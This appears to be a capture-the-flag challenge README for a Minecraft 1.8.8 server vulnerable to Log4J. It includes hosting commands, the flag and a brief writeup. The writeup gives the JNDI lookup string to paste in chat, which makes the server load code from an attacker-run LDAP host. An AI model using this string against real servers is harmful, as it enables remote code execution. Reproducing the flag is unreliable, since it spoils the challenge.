# mc
Description:
```markdown
My son asked me to make him a minecraft server! He told me to use 1.8.8 because it has better pvp mechanics or something like that. Anyway it's open so his friends can join. I hope that it doesn't log anything incorrectly...

`nc mc.chal.cyberjousting.com 9000`
or minecraft
`mc.chal.cyberjousting.com:25565`

Challenge notes:
The password for rcon is 'password'
You'll need to connect to the nc even if using the mc client.

```

**Author**: `zinko`

## Writeup
The intended solve for this challenge is for you to do some research to find (ie by searching `minecraft logging vuln`) to find out this challenge uses the Log4J vulnerability. You then must write your own payload and find a way to execute it.

Write your exploit and upload it to the web portal

Paste this string in the minecraft chat: `${jndi:ldap://{the ip your container gave you}:1389/a}`

The server now will execute your payload and if done correctly will give you the flag!

**Flag** - `byuctf{N07_my_min3cr4f7_s3rv3r}`

## Hosting

This challenge should be a Docker container that runs a minecraft server on port 25565. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
docker compose build webserver
docker compose up -d
```

To stop the challenge:
```bash
docker compose down
```
